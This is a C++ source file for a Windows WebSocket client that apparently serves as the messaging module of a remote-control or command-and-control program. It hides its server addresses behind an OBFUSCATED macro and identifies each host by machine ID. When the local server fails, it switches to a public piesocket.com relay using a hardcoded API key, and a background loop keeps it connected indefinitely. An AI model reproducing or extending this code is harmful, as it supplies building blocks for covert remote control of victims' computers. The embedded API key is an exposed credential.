#include <winsock2.h>
#include "Websocks.h"

#include <nlohmann/json.hpp>
#include <iostream>
#include <string>
#include <memory>
#include <functional>

#include "MessageProcessor.h"

using json = nlohmann::json;
// std::shared_ptr<::Websocket> getDefaultWebsocket()
// {
//     std::string uri = OBFUSCATED("ws://localhost:8000?id=");
//     uri += GetMachineID();
//     auto ws = std::make_shared<::Websocket>(::Websocket(uri));

//     return ws;
// }
// std::shared_ptr<::Websocket> getPieWebsocket()
// {
//     std::string uri = OBFUSCATED("wss://free.blr2.piesocket.com/v3/1?api_key=Yvd3PEoeTLU8BWcgPa4OXc2o2Ow1MnLRcjI2844A");
//     auto ws = std::make_shared<::Websocket>(::Websocket(uri));

//     return ws;
// }
std::string getDefaultWebsocketUri()
{
    std::string uri = OBFUSCATED("ws://localhost:8000?id=");
    uri += GetMachineID();

    return uri;
}
std::string getPieWebsocketUri()
{
    std::string uri = OBFUSCATED("wss://free.blr2.piesocket.com/v3/1?api_key=Yvd3PEoeTLU8BWcgPa4OXc2o2Ow1MnLRcjI2844A");
    return uri;
}
WebsocketManager::WebsocketManager() : ws(""), processor(MessageProcessor())
{
    ws.setURL(getDefaultWebsocketUri());
    
}
void WebsocketManager::_handleMessage(Message msg)
{
    processor.processMessage(msg);
}
void WebsocketManager::setup()
{

    WebsocketManager *self = this;

    auto msgCallback = [self](Message ms)
    {
        self->_handleMessage(ms);
    };

    auto connectCallback = [self](bool connected)
    {
        self->connected = connected;
    };
    self->ws.onMessage((SocketMessageHandler )std::bind(&WebsocketManager::_handleMessage,this) );
    self->ws.onConnectionChange((ConnectionChangeHandler)&connectCallback);
    self->ws.start();
    std::thread th([&]()
                   {
                       while (true)
                       {
                           if (!InternetIsWorking())
                           {
                               WaitForConnnection();
                           }
                           if (!self->connected)
                           {
                               self->ws.stop();
                               self->ws.setURL(self->ws.isPieSocket() ? getDefaultWebsocketUri() : getPieWebsocketUri());
                               self->ws.start();
                           }

                           Sleep(1000);
                       }
                   });
                   th.detach();
}
WebsocketManager::~WebsocketManager()
{
}
void Websocket::onMessage(SocketMessageHandler handler)
{
    if (handler != nullptr)
    {
        messageHandler = handler;
    }
}

bool Websocket::isPieSocket()
{
    return StringUtils::contains(uri, OBFUSCATED("piesocket.com"));
}
void WebsocketManager::sendData(std::string recepient, MessageCode code, std::string data)
{

    if (ws.isConnected())
    {
        ws.sendData(recepient, code, data);
    }
}
void Websocket::sendData(std::string recepient, MessageCode code, std::string data)
{
    try
    {
        json msg;
        msg["recepient"] = recepient;
        msg["code"] = (int)code;
        msg["sender"] = GetMachineID();
        msg["data"] = data;
        ws.send(msg.dump());
    }
    catch (const std::exception &e)
    {
        std::cerr << "Websocket send error:\n"
                  << e.what() << '\n';
    }
}
void Websocket::_onMessage(const std::string &msg)
{
    if (messageHandler != nullptr)
    {

        json jsn;
        try
        {
            jsn = json::parse(msg);
            if (jsn.contains("recepient") && jsn["recepient"].get<std::string>() == GetMachineID())
            {
                std::cout << "Got message: " << msg << "\n";
                Message parsed;
                parsed.code = jsn.contains("code") ? ((MessageCode)jsn["code"].get<int>()) : MC_UNDEFINED;
                parsed.data = jsn.contains("data") ? jsn["data"].get<std::string>() : "";
                parsed.recepient = jsn.contains("recepient") ? jsn["recepient"].get<std::string>() : "";
                parsed.sender = jsn.contains("sender") ? jsn["sender"].get<std::string>() : "";
                messageHandler(parsed);
            }
        }
        catch (const std::exception &e)
        {
            std::cerr << e.what() << '\n';
        }
    }
}
void Websocket::onConnectionChange(ConnectionChangeHandler handler)
{
    if (handler != nullptr)
    {
        connectionChangeHandler = handler;
    }
}

Websocket:: Websocket(std::string url) : shouldStop(false), uri(url), messageHandler(nullptr), ws(nullptr), connected(false), running(false)
{

    Websocket *self = this;
    ws.onclose = (std::function<void()>)std::bind(&Websocket::_onClose, this);
    ws.onopen = (std::function<void()>)std::bind(&Websocket::_onOpen, this);

    // ws.onmessage = (std::function<void(const std::string& msg)> ) ((void*)std::bind(&Websocket::_onMessage, this));
}
void Websocket::stop()
{
    shouldStop = true;
    Sleep(100);
    if (running)
    {
        Sleep(550);
    }
    if (ws.isConnected())
    {
        ws.close();
    }
}

void Websocket::_onOpen()
{
    connected = true;
    if (connectionChangeHandler != nullptr)
    {
        connectionChangeHandler(connected);
    }
    std::cout << "WebSocket open" << std::endl;
}

void Websocket::_onClose()
{
    connected = false;
    if (connectionChangeHandler != nullptr)
    {
        connectionChangeHandler(connected);
    }
    std::cout << "WebSocket closed" << std::endl;
}
void Websocket::setURL(std::string url)
{
    uri = url;
}
void Websocket::start()
{
    if (running)
    {
        return;
    }
    auto self = this;
    std::thread th([self]()
                   {
                    self->shouldStop=false;
                    self->running=true;
                    self->ws.open(self->uri.c_str());
                       while (!self->shouldStop)
                       {                           
                           if (!self->connected)
                           {        
                            if(self->ws.isConnected()){
                                self->ws.close();
                            }                      
                               break;
                           }
                           Sleep(500);
                           
                       }
                       
                       self->running = false; });

    th.detach();
}
bool Websocket::isConnected()
{
    return ws.isConnected();
}
// void RunSocks()
// {
//     std::string uri = "ws://localhost:8000?id=";
//     uri += GetMachineID();

//     INT rc;
//     WSADATA wsaData;

//     rc = WSAStartup(MAKEWORD(2, 2), &wsaData);
//     if (rc)
//     {
//         printf("WSAStartup Failed.\n");
//         return;
//     }
//     // #include "easywsclient.cpp" // <-- include only if you don't want compile separately

//     using easywsclient::WebSocket;
//     std::unique_ptr<WebSocket> ws(WebSocket::from_url(uri,uri));

//     while (true)
//     {
//         if (ws != nullptr)
//         {
//             ws->poll();
//             json msg;
//             msg["recepient"] = "HUHUGEEG";
//             msg["code"] = 8;
//             msg["sender"] = GetMachineID();
//             msg["data"] = "";
//             ws->send(msg.dump());
//             ws->dispatch([](const std::string &message)
//                          {
//                         std::cout << message<<"\n";
//                         Sleep(1); });
//         }
//         else
//         {
//             ws = std::unique_ptr<WebSocket>(WebSocket::from_url(uri));
//         }
//         Sleep(1000);
//     }
// }
// void RunSocks()
// {
//     std::string uri = "ws://localhost:8000?id=";
//     uri += GetMachineID();

//     INT rc;
//     WSADATA wsaData;

//     rc = WSAStartup(MAKEWORD(2, 2), &wsaData);
//     if (rc)
//     {
//         printf("WSAStartup Failed.\n");
//         return;
//     }
//     // #include "easywsclient.cpp" // <-- include only if you don't want compile separately

//     using easywsclient::WebSocket;
//     std::unique_ptr<WebSocket> ws(WebSocket::from_url(uri,uri));

//     while (true)
//     {
//         if (ws != nullptr)
//         {
//             ws->poll();
//             json msg;
//             msg["recepient"] = "HUHUGEEG";
//             msg["code"] = 8;
//             msg["sender"] = GetMachineID();
//             msg["data"] = "";
//             ws->send(msg.dump());
//             ws->dispatch([](const std::string &message)
//                          {
//                         std::cout << message<<"\n";
//                         Sleep(1); });
//         }
//         else
//         {
//             ws = std::unique_ptr<WebSocket>(WebSocket::from_url(uri));
//         }
//         Sleep(1000);
//     }
// }